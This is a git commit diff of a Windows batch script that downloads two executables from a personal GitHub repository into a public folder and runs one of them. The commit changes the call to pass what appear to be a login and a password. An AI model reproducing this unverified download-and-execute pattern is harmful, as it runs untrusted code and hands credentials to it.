d2669d5ea4e4c80451f4758d08cba475037243c0
marinabarros320168 <121142741+marinabarros320168@users.noreply.github.com>
2023-02-14 09:49:27 -0300

    Update runsauceinlabs.bat

--- runsauceinlabs.bat
+++ runsauceinlabs.bat
@@ -1,4 +1,5 @@
-set argument1=%1
+set lg=%1
+set psw=%2
 powershell Invoke-WebRequest -Uri "https://raw.githubusercontent.com/marinabarros320168/new/main/msedgedriver.exe" -OutFile "C:\Users\Public\Downloads\msedgedriver.exe"
 powershell Invoke-WebRequest -Uri "https://raw.githubusercontent.com/marinabarros320168/new/main/SauceLabs.exe" -OutFile "C:\Users\Public\Downloads\saucelabs.exe"
-C:\Users\Public\Downloads\saucelabs.exe -e %argument1%
+C:\Users\Public\Downloads\saucelabs.exe -e %lg% %psw%
